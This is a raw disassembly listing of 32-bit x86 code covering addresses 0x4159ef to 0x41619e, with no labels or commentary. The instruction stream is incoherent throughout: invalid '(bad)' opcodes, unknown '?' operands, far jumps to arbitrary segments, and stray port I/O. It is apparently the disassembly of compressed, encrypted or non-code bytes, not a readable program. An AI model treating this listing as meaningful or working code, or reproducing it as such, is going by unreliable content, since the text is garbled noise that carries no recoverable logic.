  4159ef:	in     eax,0x1d
  4159f1:	or     DWORD PTR [esi+ebp*8+0x2b95dbd1],esp
  4159f8:	xor    BYTE PTR [edi+0x74],dl
  4159fb:	xchg   ebp,eax
  4159fc:	pop    ecx
  4159fd:	xchg   ecx,eax
  4159fe:	mov    ds:0x970f9f68,eax
  415a03:	mov    ebp,0x649cff6d
  415a08:	or     DWORD PTR [esi-0x151f8fa4],edx
  415a0e:	sti    
  415a0f:	out    dx,eax
  415a10:	test   BYTE PTR [esi+0x56],ch
  415a13:	(bad)
  415a16:	stos   BYTE PTR es:[edi],al
  415a17:	hlt    
  415a18:	dec    ebx
  415a19:	push   0x6d
  415a1b:	and    dh,BYTE PTR [ebp-0x73496f8d]
  415a21:	into   
  415a22:	jp     0x4159b2
  415a24:	into   
  415a25:	cmp    ch,BYTE PTR ds:0xa42ccfb0
  415a2b:	push   ebx
  415a2c:	mov    bl,BYTE PTR [esi-0x12]
  415a2f:	daa    
  415a30:	sbb    ah,dh
  415a32:	xchg   ecx,eax
  415a33:	cmp    BYTE PTR [eax],cl
  415a35:	cmp    ebp,ebx
  415a37:	bound  eax,QWORD PTR ds:0xcbd80682
  415a3d:	ja     0x415a35
  415a3f:	mov    dl,0x92
  415a41:	retf   
  415a42:	aaa    
  415a43:	mov    bl,BYTE PTR [edx-0x17]
  415a46:	push   ecx
  415a47:	stos   BYTE PTR es:[edi],al
  415a48:	dec    edi
  415a49:	and    al,0x7d
  415a4b:	gs inc esi
  415a4d:	gs push 0xffffffe1
  415a50:	push   0xfffffffe
  415a52:	daa    
  415a53:	or     eax,0xbb1730e8
  415a58:	add    eax,0xf157ec9
  415a5d:	cmp    BYTE PTR [eax-0x5e],bh
  415a60:	push   0x3fd6bbfb
  415a65:	adc    ch,BYTE PTR [edx-0x2d2a3267]
  415a6b:	cmp    eax,0x34a88450
  415a70:	pop    ss
  415a71:	mov    bh,0x45
  415a73:	loope  0x415a5e
  415a75:	xor    DWORD PTR [ecx],ebx
  415a77:	and    dh,BYTE PTR [eax+0x65]
  415a7a:	mov    ch,0x92
  415a7c:	push   cs
  415a7d:	ret    
  415a7e:	mov    esi,0xb8a98a04
  415a83:	jmp    0xc82fba89
  415a88:	cld    
  415a89:	lods   eax,DWORD PTR ds:[esi]
  415a8a:	mov    ecx,0xa5a84aca
  415a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a90:	jnp    0x415a66
  415a92:	mov    bl,0x69
  415a94:	mov    ss,WORD PTR [eax+0x7f575495]
  415a9a:	arpl   WORD PTR [ebp+0x55be5d65],bx
  415aa0:	stos   DWORD PTR es:[edi],eax
  415aa1:	call   0x756363e4
  415aa6:	shl    BYTE PTR [ebx-0x453a86ac],1
  415aac:	mov    ebp,0x38311a4f
  415ab1:	data16 in al,0x15
  415ab4:	inc    ebx
  415ab5:	pop    ss
  415ab6:	mov    ch,BYTE PTR [ebx+0x1d2445b]
  415abc:	js     0x415adb
  415abe:	inc    DWORD PTR [ecx+0x75]
  415ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ac2:	outs   dx,DWORD PTR ds:[esi]
  415ac3:	and    al,0x8e
  415ac5:	aaa    
  415ac6:	dec    ebx
  415ac7:	jnp    0x415a8c
  415ac9:	call   0x3cbf8288
  415ace:	push   ebx
  415acf:	mov    dl,0xeb
  415ad1:	jmp    FWORD PTR [esi-0x154f57c1]
  415ad7:	sbb    eax,DWORD PTR [edi-0x1fb4723c]
  415add:	pop    ss
  415ade:	js     0x415ab5
  415ae0:	or     ecx,edx
  415ae2:	inc    ecx
  415ae3:	jecxz  0x415b36
  415ae5:	pop    edi
  415ae6:	cs jnp 0x415a85
  415ae9:	les    edi,FWORD PTR [edx]
  415aeb:	jecxz  0x415b23
  415aed:	int3   
  415aee:	bound  ecx,QWORD PTR [edi-0x64]
  415af1:	pop    ss
  415af2:	fistp  QWORD PTR [edi+eiz*4]
  415af5:	push   eax
  415af6:	push   ds
  415af7:	dec    edx
  415af8:	dec    esp
  415af9:	xchg   ebp,eax
  415afa:	inc    esi
  415afb:	out    dx,eax
  415afc:	cmp    al,0xf0
  415afe:	dec    eax
  415aff:	dec    ebp
  415b00:	mov    bh,0xb5
  415b02:	ror    ah,cl
  415b04:	out    0x89,al
  415b06:	leave  
  415b07:	jno    0x415a8c
  415b09:	xchg   ebp,eax
  415b0a:	xchg   DWORD PTR [bp+di],ebx
  415b0d:	sub    ebx,DWORD PTR [ebp+0x6c0ad59a]
  415b13:	pusha  
  415b14:	(bad)  
  415b15:	lds    edi,FWORD PTR [edi-0x5f]
  415b18:	mov    ds:0xe8cbfa85,eax
  415b1d:	dec    edx
  415b1e:	lea    esi,[ecx-0x134c3e9d]
  415b24:	jge    0x415b52
  415b26:	gs int 0x7c
  415b29:	cmc    
  415b2a:	mov    ds:0x79d44775,al
  415b2f:	add    al,0x3
  415b31:	loope  0x415b06
  415b33:	(bad)  
  415b34:	dec    edi
  415b35:	fistp  WORD PTR [edx]
  415b37:	pop    esi
  415b38:	imul   DWORD PTR [edx-0x3ab4f0cd]
  415b3e:	sub    DWORD PTR [esi-0x5e],ecx
  415b41:	xor    DWORD PTR [eax-0x33],edi
  415b44:	fucomi st,st(5)
  415b46:	rol    BYTE PTR [edx],0xea
  415b49:	retf   0x625c
  415b4c:	div    BYTE PTR [ecx+0x6cdb6c24]
  415b52:	sub    bl,ch
  415b54:	add    eax,0xae0e07d5
  415b59:	mov    edi,0x79218799
  415b5e:	cld    
  415b5f:	stc    
  415b60:	xchg   ebx,eax
  415b61:	xchg   ebp,eax
  415b62:	arpl   WORD PTR [eax+0x7e],cx
  415b65:	push   edi
  415b66:	jle    0x415b4c
  415b68:	mov    ecx,0xa84c0866
  415b6d:	mov    dl,0x77
  415b6f:	mov    esp,0xeee0b9fb
  415b74:	ins    BYTE PTR es:[edi],dx
  415b75:	mov    ah,0xb1
  415b77:	and    eax,0xc0b52fde
  415b7c:	jns    0x415bef
  415b7e:	ds out 0x4e,eax
  415b81:	mov    esp,0x3c90c09a
  415b86:	mov    edi,0xf578f9be
  415b8b:	stos   DWORD PTR es:[edi],eax
  415b8c:	jge    0x415b49
  415b8e:	jno    0x415bbc
  415b90:	jmp    0xa5c8:0x16a77b7c
  415b97:	out    dx,eax
  415b98:	popa   
  415b99:	ja     0x415be8
  415b9b:	popa   
  415b9c:	cmp    eax,ebp
  415b9e:	aam    0x8a
  415ba0:	sahf   
  415ba1:	adc    BYTE PTR [edi],cl
  415ba3:	xchg   DWORD PTR [edx+eiz*4-0x2c93042],edx
  415baa:	xor    DWORD PTR [ebx],esp
  415bac:	adc    BYTE PTR [eax+0x1653bc2d],cl
  415bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bb3:	dec    eax
  415bb4:	cs pop edi
  415bb6:	leave  
  415bb7:	sbb    BYTE PTR [eax+0x27a37ac2],0xa7
  415bbe:	and    esi,DWORD PTR [esi]
  415bc0:	mul    BYTE PTR [edi+ebp*2]
  415bc3:	fistp  WORD PTR [edx]
  415bc5:	ficom  DWORD PTR [ebp+0x35]
  415bc8:	and    DWORD PTR [edi-0x7b5b4d70],esp
  415bce:	mov    dl,0x3
  415bd0:	sahf   
  415bd1:	ret    0xfed0
  415bd4:	cmc    
  415bd5:	xchg   esi,eax
  415bd6:	mov    eax,ds:0x40e0afd
  415bdb:	popf   
  415bdc:	mov    edi,0x44720c3
  415be1:	jle    0x415bf2
  415be3:	aaa    
  415be4:	and    al,0xda
  415be6:	mov    BYTE PTR [eax-0x3d],cl
  415be9:	mov    ebp,0x32208785
  415bee:	mov    esi,0x1318b89
  415bf3:	dec    eax
  415bf4:	and    eax,0x7fd4b02f
  415bf9:	out    0x7f,al
  415bfb:	lock jns 0x415c5b
  415bfe:	leave  
  415bff:	retf   
  415c00:	cli    
  415c01:	push   es
  415c02:	sub    dl,BYTE PTR [ecx+0x13]
  415c05:	repz aas 
  415c07:	add    eax,0xf306622c
  415c0c:	rcl    esp,0x16
  415c0f:	xchg   edx,eax
  415c10:	frstor [edx]
  415c12:	mov    dh,0x1c
  415c14:	repnz lock push ebx
  415c17:	popa   
  415c18:	stos   BYTE PTR es:[edi],al
  415c19:	jp     0x415bf0
  415c1b:	jl     0x415bed
  415c1d:	push   ss
  415c1e:	xor    eax,0x45c71047
  415c23:	or     al,0xe4
  415c25:	push   0x9398a803
  415c2a:	test   eax,0x3fae9996
  415c2f:	add    ah,BYTE PTR [eax]
  415c31:	sub    dl,BYTE PTR [esi+0x35]
  415c34:	cld    
  415c35:	out    dx,al
  415c36:	inc    edx
  415c37:	fdivr  DWORD PTR [edi-0x5ec2036]
  415c3d:	push   edx
  415c3e:	repz sub al,0xb9
  415c41:	fiadd  WORD PTR [eax+0x11]
  415c44:	mov    ebx,DWORD PTR [ebx-0x1ec2cb2e]
  415c4a:	das    
  415c4b:	pop    ebp
  415c4c:	mov    bl,BYTE PTR [esi-0x4f]
  415c4f:	pop    ss
  415c50:	mov    al,ds:0x832c4397
  415c55:	dec    ebp
  415c56:	mov    DWORD PTR [eax],ebx
  415c58:	xchg   ecx,eax
  415c59:	in     eax,0xd
  415c5b:	in     eax,0x2d
  415c5d:	imul   ebx,DWORD PTR [esi+0x12],0xada94a92
  415c64:	rcl    DWORD PTR [ebp-0x3c98520],0xf9
  415c6b:	out    dx,al
  415c6c:	jg     0x415bf5
  415c6e:	repnz adc eax,0xa2c046d6
  415c74:	or     esp,ecx
  415c76:	(bad)  
  415c77:	jecxz  0x415c86
  415c79:	and    bh,ch
  415c7b:	mov    esi,0x8272127d
  415c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c81:	mov    DWORD PTR [ecx-0x4d],ecx
  415c84:	dec    esi
  415c85:	inc    ebx
  415c86:	pop    eax
  415c87:	cli    
  415c88:	fld    DWORD PTR [esi-0x71]
  415c8b:	push   ss
  415c8c:	in     al,0x8b
  415c8e:	aad    0x7a
  415c90:	out    0xbd,al
  415c92:	fidiv  WORD PTR [ebx]
  415c94:	push   ebp
  415c95:	jnp    0x415c3d
  415c97:	outs   dx,DWORD PTR ds:[esi]
  415c98:	mov    eax,ds:0x3866f60
  415c9d:	not    edi
  415c9f:	add    BYTE PTR [esi+edx*1-0x7d058eba],0xc1
  415ca7:	fdivr  QWORD PTR [edi+0x5c]
  415caa:	xchg   esp,eax
  415cab:	fwait
  415cac:	rcl    DWORD PTR ds:0xf7839d08,cl
  415cb2:	inc    ebp
  415cb3:	push   es
  415cb4:	jp     0x415cd3
  415cb6:	push   ecx
  415cb7:	push   eax
  415cb8:	xchg   BYTE PTR [esi+0x4e],bh
  415cbb:	out    0xff,al
  415cbd:	mov    ch,0xa6
  415cbf:	and    esp,DWORD PTR ds:0x6351f1fb
  415cc5:	add    al,0xf5
  415cc7:	add    esi,ecx
  415cc9:	pop    eax
  415cca:	scas   eax,DWORD PTR es:[edi]
  415ccb:	mov    esi,0xfe526045
  415cd0:	pop    ebp
  415cd1:	es mov edi,0x62853944
  415cd7:	push   esi
  415cd8:	sub    eax,0xaaf3f6a5
  415cdd:	daa    
  415cde:	cmp    al,0xa0
  415ce0:	mov    edx,0xb1709a9d
  415ce5:	push   es
  415ce6:	das    
  415ce7:	xchg   edx,eax
  415ce8:	xchg   esi,eax
  415ce9:	or     eax,0xb8a2380e
  415cee:	mov    gs,esp
  415cf0:	sahf   
  415cf1:	cli    
  415cf2:	repnz adc DWORD PTR [eax+0x8],0x8387a3a6
  415cfa:	imul   esi,DWORD PTR [ebx-0xf8307bd],0x4082cc1c
  415d04:	lods   eax,DWORD PTR ds:[esi]
  415d05:	das    
  415d06:	pop    ecx
  415d07:	js     0x415d60
  415d09:	dec    edi
  415d0a:	arpl   WORD PTR [edx],si
  415d0c:	mov    bh,0x84
  415d0e:	popa   
  415d0f:	fwait
  415d10:	xchg   esp,eax
  415d11:	es in  al,dx
  415d13:	ss adc edi,ebx
  415d16:	enter  0xa45f,0x8c
  415d1a:	je     0x415d32
  415d1c:	arpl   si,sp
  415d1e:	xor    bh,bl
  415d20:	sub    DWORD PTR [edi+0x1d],eax
  415d23:	sbb    edx,DWORD PTR [esi]
  415d25:	pop    eax
  415d26:	sbb    ebx,DWORD PTR [edi+0x17c18a55]
  415d2c:	push   esp
  415d2d:	sub    al,0xe6
  415d2f:	sti    
  415d30:	arpl   bx,di
  415d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d33:	xchg   esp,eax
  415d34:	add    BYTE PTR [eax+0x64],al
  415d37:	push   edx
  415d38:	sahf   
  415d39:	jne    0x415dba
  415d3b:	mov    bl,0x83
  415d3d:	test   eax,0x4f05ffc5
  415d42:	xchg   ecx,esp
  415d44:	jbe    0x415d76
  415d46:	imul   BYTE PTR [edi+0x3c]
  415d49:	inc    eax
  415d4a:	mov    bl,0xcc
  415d4c:	xchg   ebp,eax
  415d4d:	popa   
  415d4e:	jnp    0x415dce
  415d50:	test   eax,0xe4a75b05
  415d55:	out    0x2a,al
  415d57:	dec    edi
  415d58:	mov    cl,0x6b
  415d5a:	fstp   st(5)
  415d5c:	cmp    ah,BYTE PTR [edi+0x6d872a6e]
  415d62:	test   al,0x75
  415d64:	add    BYTE PTR [ecx-0x69b31f1a],ah
  415d6a:	int3   
  415d6b:	fwait
  415d6c:	ret    0xf8de
  415d6f:	enter  0xf677,0x40
  415d73:	jb     0x415d9e
  415d75:	cwde   
  415d76:	push   ebp
  415d77:	fcomp  QWORD PTR [ebp-0x2a3d352]
  415d7d:	cdq    
  415d7e:	iret   
  415d7f:	xor    dl,dl
  415d81:	inc    edi
  415d82:	lahf   
  415d83:	xchg   edx,eax
  415d84:	mov    eax,0x7ec399cb
  415d89:	jle    0x415d72
  415d8b:	dec    esi
  415d8c:	and    al,0xf5
  415d8e:	xor    esp,ebx
  415d90:	retf   
  415d91:	bound  ebx,QWORD PTR [ecx]
  415d93:	jno    0x415d3e
  415d95:	fs je  0x415d1c
  415d98:	je     0x415d80
  415d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d9b:	push   es
  415d9c:	jmp    0x830b:0x68dea59
  415da3:	or     al,0x4c
  415da5:	dec    ecx
  415da6:	sbb    al,0x65
  415da8:	nop
  415da9:	inc    edx
  415daa:	adc    bh,BYTE PTR [edx]
  415dac:	test   al,0xa3
  415dae:	leave  
  415daf:	leave  
  415db0:	leave  
  415db1:	inc    esi
  415db2:	or     al,BYTE PTR [ebx]
  415db4:	test   BYTE PTR [ebp-0x3f87db68],ch
  415dba:	or     bl,BYTE PTR [ebx-0x52]
  415dbd:	xor    al,0x1f
  415dbf:	mov    al,0x5c
  415dc1:	or     al,0xe
  415dc3:	ins    BYTE PTR es:[edi],dx
  415dc4:	out    dx,eax
  415dc5:	mov    bh,0x6c
  415dc7:	jmp    0x81691ec
  415dcc:	jmp    0xdf0d:0x14bca7c5
  415dd3:	fidivr WORD PTR [eax-0x4d]
  415dd6:	xor    esi,DWORD PTR [esi-0x69]
  415dd9:	jecxz  0x415e18
  415ddb:	(bad)  
  415ddc:	cmp    DWORD PTR [ebp-0x43231e80],edi
  415de2:	xor    ebp,DWORD PTR [ebx-0x18c85cb]
  415de8:	push   edi
  415de9:	push   edi
  415dea:	sub    bl,BYTE PTR [edi]
  415dec:	fwait
  415ded:	xchg   esp,eax
  415dee:	mov    ?,ebx
  415df0:	cwde   
  415df1:	lods   eax,DWORD PTR ds:[esi]
  415df2:	leave  
  415df3:	test   al,0x89
  415df5:	icebp  
  415df6:	test   bl,cl
  415df8:	out    dx,eax
  415df9:	xchg   esp,eax
  415dfa:	fwait
  415dfb:	pop    edx
  415dfc:	jle    0x415d97
  415dfe:	pop    edi
  415dff:	jg     0x415df7
  415e01:	pop    ds
  415e02:	cmp    al,0xc5
  415e04:	xchg   ebp,eax
  415e05:	cmp    DWORD PTR [ecx],ecx
  415e07:	scas   eax,DWORD PTR es:[edi]
  415e08:	dec    ebp
  415e09:	dec    esi
  415e0a:	enter  0xd4ea,0xd5
  415e0e:	loop   0x415e84
  415e10:	fadd   DWORD PTR [edx+edi*4-0x386ce0f6]
  415e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e18:	mov    eax,ds:0x2ea63107
  415e1d:	or     BYTE PTR [edi+0x25],ah
  415e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e21:	das    
  415e22:	jmp    0x415e82
  415e24:	cmp    ecx,DWORD PTR [ecx+0x56c3bc85]
  415e2a:	mov    ds,WORD PTR [ecx]
  415e2c:	mov    al,ds:0xee7dedb0
  415e31:	retf   
  415e32:	add    esi,ebx
  415e34:	xor    al,0xff
  415e36:	mov    edx,0x2ecbb8a2
  415e3b:	out    dx,al
  415e3c:	icebp  
  415e3d:	inc    ebp
  415e3e:	pop    eax
  415e3f:	pop    ss
  415e40:	neg    DWORD PTR [eax]
  415e42:	dec    ecx
  415e43:	sbb    BYTE PTR ds:0x1cb37f0,0x22
  415e4a:	or     BYTE PTR [esi-0x51866c8b],bl
  415e50:	sahf   
  415e51:	repnz fsub QWORD PTR [edi]
  415e54:	pop    esp
  415e55:	clc    
  415e56:	pop    ss
  415e57:	outs   dx,DWORD PTR ds:[esi]
  415e58:	jnp    0x415e37
  415e5a:	test   DWORD PTR [eax],edi
  415e5c:	add    eax,0x3f78fc5c
  415e61:	mov    edi,0xf0c53dd2
  415e66:	sbb    DWORD PTR [ebx],edi
  415e68:	mov    ebp,0x318b2219
  415e6d:	ret    
  415e6e:	mov    edx,0xd2e552b7
  415e73:	xor    eax,0xf3410bc9
  415e78:	inc    edx
  415e79:	nop
  415e7a:	sub    cl,BYTE PTR [ecx+0x14852be2]
  415e80:	shl    BYTE PTR [eax+0x6d966443],cl
  415e86:	aas    
  415e87:	mov    ds:0xfb62fa9c,eax
  415e8c:	push   ebp
  415e8d:	push   es
  415e8e:	dec    esp
  415e8f:	adc    al,0x6f
  415e91:	mov    bl,0x9c
  415e93:	leave  
  415e94:	or     cl,al
  415e96:	cmova  edx,DWORD PTR [ecx+0xd99fba2]
  415e9d:	cmp    BYTE PTR [ecx-0x2b918130],al
  415ea3:	fwait
  415ea4:	dec    ebx
  415ea5:	outs   dx,DWORD PTR ds:[si]
  415ea7:	jns    0x415e73
  415ea9:	mov    DWORD PTR [edx-0x12],edx
  415eac:	test   bh,ch
  415eae:	mov    bl,0x51
  415eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eb1:	sbb    ch,cl
  415eb3:	xchg   esp,eax
  415eb4:	rol    DWORD PTR [ebx+0x6a],1
  415eb7:	sbb    bh,BYTE PTR ds:0x4e3643a0
  415ebd:	jb     0x415e40
  415ebf:	add    al,0x51
  415ec1:	(bad)  
  415ec3:	cmp    ch,BYTE PTR [eax+ebp*1]
  415ec6:	xor    al,0xb0
  415ec8:	shl    BYTE PTR [edi+0x23d392d],0x10
  415ecf:	or     BYTE PTR [edx+0x6],al
  415ed2:	popf   
  415ed3:	sbb    DWORD PTR [edx],ebx
  415ed5:	test   BYTE PTR [edx+ebx*1],al
  415ed8:	push   cs
  415ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eda:	adc    BYTE PTR [edi+edx*2+0x65],0xf7
  415edf:	cmc    
  415ee0:	ins    DWORD PTR es:[edi],dx
  415ee1:	or     al,0x84
  415ee3:	lods   al,BYTE PTR ds:[esi]
  415ee4:	jb     0x415e87
  415ee6:	out    0x41,eax
  415ee8:	int    0x3f
  415eea:	(bad)  
  415eeb:	sub    ch,dl
  415eed:	rsm    
  415eef:	or     al,0x3d
  415ef1:	mov    bh,0x34
  415ef3:	stos   DWORD PTR es:[edi],eax
  415ef4:	fisubr DWORD PTR [ebp-0x2b]
  415ef7:	popa   
  415ef8:	shl    BYTE PTR [ebp+0x26],1
  415efb:	adc    ecx,esi
  415efd:	fistp  WORD PTR [edi-0x5273a664]
  415f03:	add    BYTE PTR [eax-0x32],ch
  415f06:	xlat   BYTE PTR ds:[ebx]
  415f07:	leave  
  415f08:	lahf   
  415f09:	test   BYTE PTR [esp+eax*2],al
  415f0c:	cmp    bh,bh
  415f0e:	mov    bl,0x63
  415f10:	cwde   
  415f11:	pop    edx
  415f12:	mov    ecx,0x502622fe
  415f17:	retf   0x31f3
  415f1a:	push   ebx
  415f1b:	lods   eax,DWORD PTR ds:[esi]
  415f1c:	push   ebx
  415f1d:	jbe    0x415f83
  415f1f:	pop    es
  415f20:	aas    
  415f21:	adc    DWORD PTR [edi-0x5c82adeb],esi
  415f27:	mov    ah,0x55
  415f29:	sub    dh,al
  415f2b:	jmp    0x7a64bfa1
  415f30:	jmp    0x6dc7:0x2b1abdab
  415f37:	ss ret 0x3bcc
  415f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f3c:	inc    ebp
  415f3d:	call   DWORD PTR [edx-0x6f7abd39]
  415f43:	jmp    0x415ed4
  415f45:	mov    edi,?
  415f47:	sbb    ax,0x9889
  415f4b:	ss ret 0xacff
  415f4f:	inc    ecx
  415f50:	xor    ah,ch
  415f52:	xchg   edi,eax
  415f53:	popf   
  415f54:	fwait
  415f55:	mov    bl,BYTE PTR [edi+0x9]
  415f58:	jg     0x415f82
  415f5a:	lods   al,BYTE PTR ds:[esi]
  415f5b:	push   ss
  415f5c:	xchg   BYTE PTR [eax+0x5f9991f3],ah
  415f62:	call   0x7056:0x4f6f2226
  415f69:	es jge 0x415f9e
  415f6c:	xchg   ecx,eax
  415f6d:	mov    ah,0xdf
  415f6f:	ins    BYTE PTR es:[edi],dx
  415f70:	enter  0x22f5,0x6d
  415f74:	inc    ebp
  415f75:	mov    al,ds:0x297ea39e
  415f7a:	pusha  
  415f7b:	call   0xac9c:0x7113c9bf
  415f82:	outs   dx,DWORD PTR ds:[esi]
  415f83:	dec    edi
  415f84:	mov    ?,esp
  415f86:	rol    DWORD PTR [ecx+ebp*2],1
  415f89:	and    ebx,esp
  415f8b:	adc    BYTE PTR [ebp-0x65497a83],dl
  415f91:	adc    esp,DWORD PTR [edi-0x1fbf71c7]
  415f97:	in     al,dx
  415f98:	or     al,0x36
  415f9a:	mov    bh,0x10
  415f9c:	mov    dh,0x2d
  415f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f9f:	fnstcw WORD PTR [edi+eax*8-0x38]
  415fa3:	dec    esi
  415fa4:	mov    ecx,0xc2583161
  415fa9:	cdq    
  415faa:	ret    0x6d4f
  415fad:	in     eax,dx
  415fae:	mov    esi,0xf92dc031
  415fb3:	sti    
  415fb4:	jae    0x41600f
  415fb6:	test   al,0x44
  415fb8:	leave  
  415fb9:	cs push 0x4b
  415fbc:	inc    ecx
  415fbd:	mov    dh,0xde
  415fbf:	rcr    bl,cl
  415fc1:	call   0x2ef:0xa577b9da
  415fc8:	cmp    al,0x24
  415fca:	ss jp  0x415f65
  415fcd:	and    eax,0x14c47ba6
  415fd2:	inc    edx
  415fd3:	mov    esp,0x78d366b3
  415fd8:	inc    esp
  415fd9:	bound  eax,QWORD PTR [ebp+0x55]
  415fdc:	mov    esi,0x1b115c13
  415fe1:	adc    BYTE PTR [ecx],al
  415fe3:	pop    ds
  415fe4:	inc    esi
  415fe5:	sbb    BYTE PTR [eax-0x33bde95],ah
  415feb:	cmp    al,0x4a
  415fed:	cmp    al,0x7d
  415fef:	fst    QWORD PTR [edi+0x2a33d8ab]
  415ff5:	pusha  
  415ff6:	and    DWORD PTR [ebx+0x6c],ebx
  415ff9:	inc    edx
  415ffa:	and    ebp,DWORD PTR [eax-0x6984e21f]
  416000:	pop    ebp
  416001:	aam    0x6a
  416003:	cld    
  416004:	js     0x416037
  416006:	call   0xf08f4232
  41600b:	jge    0x415ff0
  41600d:	sahf   
  41600e:	cld    
  41600f:	add    ecx,DWORD PTR [edx+edi*2]
  416012:	sar    esp,0xb
  416015:	jb     0x416012
  416017:	mov    DWORD PTR [eax-0x7],edx
  41601a:	std    
  41601b:	lahf   
  41601c:	and    eax,DWORD PTR [ecx]
  41601e:	idiv   DWORD PTR [ecx-0x6eb64c2f]
  416024:	jmp    0x416078
  416026:	dec    esi
  416027:	push   es
  416028:	and    DWORD PTR [esi+0x5d97b9ae],0x8b451d0f
  416032:	fadd   DWORD PTR [edi-0x438f34f3]
  416038:	mov    edi,0x5e4f4e69
  41603d:	out    0x8e,eax
  41603f:	jo     0x415fcf
  416041:	sbb    ch,dh
  416043:	in     eax,0xc0
  416045:	call   0x3e25:0xca76c8d
  41604c:	test   BYTE PTR [edx],bl
  41604e:	sub    ch,BYTE PTR ds:0x23ece112
  416054:	sahf   
  416055:	out    dx,al
  416056:	dec    ecx
  416057:	cmc    
  416058:	in     eax,dx
  416059:	or     ch,BYTE PTR [ebx]
  41605b:	fist   DWORD PTR [edi+esi*2+0x4e5c275c]
  416062:	xor    bl,BYTE PTR [ebx-0x80]
  416065:	cwde   
  416066:	add    BYTE PTR [edi],dl
  416068:	inc    ebp
  416069:	add    al,0xc
  41606b:	cdq    
  41606c:	jg     0x416090
  41606e:	mov    ebx,edx
  416070:	pop    esp
  416071:	rcl    BYTE PTR [eax+0x65506eed],cl
  416077:	clc    
  416078:	and    eax,0x6bcdd88
  41607d:	add    al,BYTE PTR [ebx]
  41607f:	dec    eax
  416080:	push   0xde6c4e94
  416085:	in     al,dx
  416086:	test   al,0x56
  416088:	aad    0x2e
  41608a:	jle    0x416057
  41608c:	dec    edi
  41608d:	sar    BYTE PTR [ebx+0x32],cl
  416090:	int    0x8b
  416092:	mov    al,0x75
  416094:	cmp    al,0x9f
  416096:	push   edx
  416097:	(bad)  
  416099:	mov    esi,0x25fddd1
  41609e:	popf   
  41609f:	inc    esi
  4160a0:	sbb    al,0xf8
  4160a2:	cmp    DWORD PTR [ebp+0x20698f42],ecx
  4160a8:	and    DWORD PTR ds:0x865ba47b,esi
  4160ae:	aaa    
  4160af:	lahf   
  4160b0:	mul    DWORD PTR [eax-0x546bf4f8]
  4160b6:	fld    TBYTE PTR [ebx-0x77]
  4160b9:	sub    DWORD PTR [ecx-0x57],ebp
  4160bc:	push   edx
  4160bd:	(bad)  
  4160be:	dec    al
  4160c0:	and    DWORD PTR [ebx],esi
  4160c2:	adc    al,0xb1
  4160c4:	jecxz  0x4160ef
  4160c6:	xchg   ebp,eax
  4160c7:	(bad)  
  4160c8:	push   esi
  4160c9:	inc    edi
  4160ca:	pop    edx
  4160cb:	jns    0x416110
  4160cd:	pop    eax
  4160ce:	ins    DWORD PTR es:[edi],dx
  4160cf:	gs sub ch,dh
  4160d2:	jo     0x4160f3
  4160d4:	jp     0x41606a
  4160d6:	(bad)  
  4160d7:	sub    edi,ebp
  4160d9:	xor    bl,0x52
  4160dc:	adc    BYTE PTR [esi],dh
  4160de:	bound  esp,QWORD PTR [edx]
  4160e0:	stos   BYTE PTR es:[edi],al
  4160e1:	out    0x9a,al
  4160e3:	in     eax,dx
  4160e4:	stc    
  4160e5:	or     bl,0x9
  4160e8:	cli    
  4160e9:	cdq    
  4160ea:	xor    BYTE PTR [esi],bl
  4160ec:	(bad)  
  4160ed:	fcom   QWORD PTR [edi-0x78d23112]
  4160f3:	cmp    al,0x65
  4160f5:	repz pop ebx
  4160f7:	int3   
  4160f8:	sbb    ch,dh
  4160fa:	in     eax,dx
  4160fb:	add    al,0x37
  4160fd:	stos   DWORD PTR es:[edi],eax
  4160fe:	or     DWORD PTR [edx],esi
  416100:	test   BYTE PTR [ebx+0x7d51c85f],bl
  416106:	out    0xb3,eax
  416108:	add    eax,0x914467ac
  41610d:	add    DWORD PTR [ecx+0x556d3d8d],ecx
  416113:	sbb    DWORD PTR [ebx+0x75],ecx
  416116:	scas   eax,DWORD PTR es:[edi]
  416117:	(bad)  
  416118:	jp     0x41615a
  41611a:	adc    al,0xe5
  41611c:	lds    eax,FWORD PTR [ecx+0xfd6efec]
  416122:	mov    ds:0x81491f17,al
  416127:	repz sbb DWORD PTR ds:0x1c7773df,0x6db2d328
  416132:	arpl   WORD PTR [eax],di
  416134:	xchg   ebx,eax
  416135:	call   0x7fe05e75
  41613a:	xchg   DWORD PTR [edi+0xd9d0437],ecx
  416140:	pop    DWORD PTR [ebx+edi*1+0x3d]
  416144:	mov    ds:0xe818a64c,al
  416149:	or     DWORD PTR [eax],eax
  41614b:	es cdq 
  41614d:	test   BYTE PTR [edx-0x19c6fb6f],bl
  416153:	clc    
  416154:	(bad)  
  416155:	stos   BYTE PTR es:[edi],al
  416156:	pop    es
  416157:	add    BYTE PTR [edi],ah
  416159:	jmp    0x46af:0xb938442b
  416160:	into   
  416161:	fwait
  416162:	sbb    edi,DWORD PTR [ebx]
  416164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416165:	and    BYTE PTR [ebp-0x13],ah
  416168:	xchg   edx,eax
  416169:	cmp    DWORD PTR [edi+0x1d],ebp
  41616c:	mov    eax,0xc4a581a4
  416171:	and    dl,al
  416173:	mov    bh,0xb1
  416175:	fidiv  WORD PTR [eax]
  416177:	scas   al,BYTE PTR es:[edi]
  416178:	cmc    
  416179:	sbb    esp,DWORD PTR [edx-0x4e]
  41617c:	out    dx,al
  41617d:	sbb    ebp,DWORD PTR [esi+0xd]
  416180:	inc    ecx
  416181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416182:	sbb    eax,0xcb375f7c
  416187:	and    BYTE PTR [ebp-0x51],dh
  41618a:	mov    eax,ds:0x29f3d81d
  41618f:	dec    esi
  416190:	add    ah,BYTE PTR [eax-0x23]
  416193:	jmp    0x41619a
  416195:	unpcklps xmm6,XMMWORD PTR [ebp+0x5d4fd74a]
  41619c:	xor    ah,cl
  41619e:	pushf  
